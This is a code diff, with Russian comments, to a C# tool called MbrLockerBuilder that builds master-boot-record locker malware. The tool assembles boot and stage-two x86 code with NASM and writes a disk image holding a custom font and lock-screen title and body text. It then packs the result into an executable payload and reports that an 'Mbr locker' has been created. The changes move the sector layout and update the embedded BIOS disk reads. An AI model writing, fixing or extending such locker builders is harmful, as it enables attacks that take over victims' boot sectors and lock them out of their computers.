@@ -322,13 +322,10 @@ namespace MbrLockerBuilder
         }
 
         // ============================================================
-        // ГЕНЕРАЦИЯ ШРИФТА CP866 ИЗ РЕСУРСА (С ПОИСКОМ ПО ЧАСТИ ИМЕНИ)
+        // ГЕНЕРАЦИЯ ШРИФТА CP866 ИЗ РЕСУРСА
         // ============================================================
         private byte[] GenerateCP866Font()
         {
-            // ============================================================
-            // МЕТОД 1: Поиск по части имени (как в FindResourceByPartialName)
-            // ============================================================
             try
             {
                 string[] allResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
@@ -350,60 +347,17 @@ namespace MbrLockerBuilder
             }
             catch { }
 
-            // ============================================================
-            // МЕТОД 2: Поиск по полному имени (запасной вариант)
-            // ============================================================
-            try
-            {
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.cp866_font.bin"))
-                {
-                    if (stream != null)
-                    {
-                        byte[] font = new byte[4096];
-                        stream.Read(font, 0, 4096);
-                        return font;
-                    }
-                }
-            }
-            catch { }
-
-            // ============================================================
-            // МЕТОД 3: Поиск файла на диске (рядом с EXE)
-            // ============================================================
             string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "cp866_font.bin");
             if (File.Exists(localPath))
                 return File.ReadAllBytes(localPath);
 
-            // ============================================================
-            // МЕТОД 4: Поиск файла в папке проекта (для отладки)
-            // ============================================================
-            string projectPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "builder", "Resources", "cp866_font.bin");
-            if (File.Exists(projectPath))
-                return File.ReadAllBytes(projectPath);
-
-            // ============================================================
-            // Если ничего не найдено — предупреждение и пустой шрифт
-            // ============================================================
-            MessageBox.Show(
-                "Шрифт cp866_font.bin не найден!\n\n" +
-                "Русский текст будет отображаться неправильно.\n\n" +
-                "Проверьте, что файл cp866_font.bin добавлен в ресурсы проекта.",
-                "Предупреждение",
-                MessageBoxButtons.OK,
-                MessageBoxIcon.Warning
-            );
-            
+            MessageBox.Show("Шрифт cp866_font.bin не найден!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Warning);
             return new byte[4096];
         }
-
-        // ============================================================
-        // МЕТОДЫ ДЛЯ ПОДДЕРЖКИ РУССКОГО ЯЗЫКА
-        // ============================================================
 
         private string ConvertToDosHex(string text)
         {
             if (string.IsNullOrEmpty(text)) return "";
-            
             try
             {
                 Encoding dos = Encoding.GetEncoding(866);
@@ -446,7 +400,6 @@ namespace MbrLockerBuilder
                         MessageBoxButtons.YesNo,
                         MessageBoxIcon.Warning
                     );
-                    
                     if (result == DialogResult.No)
                         return;
                 }
@@ -488,59 +441,57 @@ namespace MbrLockerBuilder
                 RunNasm(nasmPath, stage2Path, stage2BinPath);
                 byte[] stage2Bytes = File.ReadAllBytes(stage2BinPath);
 
+                // ПРОВЕРКА: Stage2 должен быть не пустым
+                if (stage2Bytes.Length < 100 || stage2Bytes[0] != 0xB8)
+                {
+                    MessageBox.Show($"Ошибка: Stage2 не скомпилирован! Размер: {stage2Bytes.Length} байт, первый байт: 0x{stage2Bytes[0]:X2}",
+                        "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+
                 this.lblStatus.Text = "4/7 Сборка образа...";
                 Application.DoEvents();
 
-                int totalSectors = 19;
+                // НОВАЯ СТРУКТУРА: 23 сектора (0-22)
+                int totalSectors = 23;
                 byte[] fullImage = new byte[512 * totalSectors];
-                
-                // MBR (сектор 0)
+
+                // 1. MBR (сектор 0)
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
-                
-                // Stage2 (сектора 9-18)
-                Array.Copy(stage2Bytes, 0, fullImage, 512 * 9, Math.Min(stage2Bytes.Length, 512 * 10));
 
-                // ============================================================
-                // ЗАПИСЫВАЕМ ПОЛЬЗОВАТЕЛЬСКИЙ ШРИФТ (СЕКТОРА 3-6)
-                // ============================================================
-                this.lblStatus.Text = "4.1/7 Генерация шрифта...";
-                Application.DoEvents();
-
+                // 2. Шрифт (сектора 3-10) — 8 секторов = 4096 байт
                 byte[] fontData = GenerateCP866Font();
                 if (fontData != null && fontData.Length >= 4096)
                 {
-                    // Шрифт занимает 4 сектора (4096 байт)
                     Array.Copy(fontData, 0, fullImage, 512 * 3, 4096);
                 }
                 else
                 {
-                    MessageBox.Show("Шрифт cp866_font.bin не загружен или имеет неправильный размер!",
-                        "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    MessageBox.Show("Шрифт cp866_font.bin не загружен!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
                 }
 
-                // ============================================================
-                // ЗАПИСЫВАЕМ ТЕКСТ В СЕКТОРА (7, 8) С ТЕРМИНАЛЬНЫМ НУЛЕМ
-                // ============================================================
+                // 3. Заголовок (сектор 11)
                 string title = this.txtTitle.Text.Trim();
-                string body = this.txtBody.Text.Trim();
                 if (string.IsNullOrEmpty(title)) title = "LOCKED";
-                if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
-
                 string border = "========================================\r\n";
                 string formattedTitle = "     " + title + "     \r\n";
-                string formattedBody = body.Replace("\n", "\r\n");
-
-                // --- Заголовок (сектор 7) с терминальным нулём ---
                 string titleText = border + formattedTitle + border + "\r\n\0";
                 byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(titleText);
                 if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
-                Array.Copy(titleBytes, 0, fullImage, 512 * 7, titleBytes.Length);
+                Array.Copy(titleBytes, 0, fullImage, 512 * 11, titleBytes.Length);
 
-                // --- Основной текст (сектор 8) с терминальным нулём ---
+                // 4. Текст (сектор 12)
+                string body = this.txtBody.Text.Trim();
+                if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
+                string formattedBody = body.Replace("\n", "\r\n");
                 string bodyText = formattedBody + "\0";
                 byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(bodyText);
                 if (bodyBytes.Length > 512) Array.Resize(ref bodyBytes, 512);
-                Array.Copy(bodyBytes, 0, fullImage, 512 * 8, bodyBytes.Length);
+                Array.Copy(bodyBytes, 0, fullImage, 512 * 12, bodyBytes.Length);
+
+                // 5. Stage2 (сектора 13-22) — 10 секторов
+                Array.Copy(stage2Bytes, 0, fullImage, 512 * 13, Math.Min(stage2Bytes.Length, 512 * 10));
 
                 this.lblStatus.Text = "5/7 Получение template.exe...";
                 Application.DoEvents();
@@ -601,7 +552,6 @@ namespace MbrLockerBuilder
                 {
                     File.WriteAllBytes(this.saveFileDialog.FileName, payloadBytes);
                     this.lblStatus.Text = "Готово: " + Path.GetFileName(this.saveFileDialog.FileName);
-
                     MessageBox.Show("Mbr locker создан!", "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 }
                 else
@@ -637,10 +587,6 @@ namespace MbrLockerBuilder
             if (nasm.ExitCode != 0)
                 throw new Exception("NASM Error: " + nasm.StandardError.ReadToEnd());
         }
-
-        // ============================================================
-        // МЕТОДЫ ДЛЯ ЗАГРУЗКИ ASM ИЗ РЕСУРСОВ
-        // ============================================================
 
         private string GenerateMBR()
         {
@@ -683,7 +629,7 @@ start:
     mov ah, 0x02
     mov al, 10
     mov ch, 0
-    mov cl, 9
+    mov cl, 13
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -765,7 +711,7 @@ start_stage2:
     mov es, ax
     mov bx, 0x1000
     mov ah, 0x02
-    mov al, 4
+    mov al, 8
     mov ch, 0
     mov cl, 3
     mov dh, 0
@@ -786,7 +732,7 @@ start_stage2:
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 7
+    mov cl, 11
     mov dh, 0
     mov dl, 0x80
     int 0x13
@@ -801,7 +747,7 @@ start_stage2:
     mov ah, 0x02
     mov al, 1
     mov ch, 0
-    mov cl, 8
+    mov cl, 12
     mov dh, 0
     mov dl, 0x80
     int 0x13
